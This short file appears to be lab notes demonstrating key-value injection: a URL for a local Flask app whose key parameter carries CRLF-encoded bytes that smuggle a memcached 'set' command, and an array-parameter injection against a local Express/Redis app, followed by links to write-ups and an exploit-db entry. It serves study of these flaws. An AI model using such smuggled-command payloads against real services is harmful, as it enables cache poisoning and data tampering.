Flask - memcached

http://127.0.0.1:8800/api/set?key=a%0d%0a1%0d%0aset%20injected%200%203600%205%0d%0apwned%0d%0a

http://127.0.0.1:8800/api/get?key=injected

Express - Redis

http://127.0.0.1:8801/query?key[]=test&key[]=pwned

http://127.0.0.1:8801/?key=test

https://medium.com/@d0znpp/ssrf-memcached-and-other-key-value-injections-in-the-wild-c8d223bd856f
https://www.exploit-db.com/exploits/37815
https://medium.com/@PatrickSpiegel/https-medium-com-patrickspiegel-nosql-injection-redis-25b332d09e58
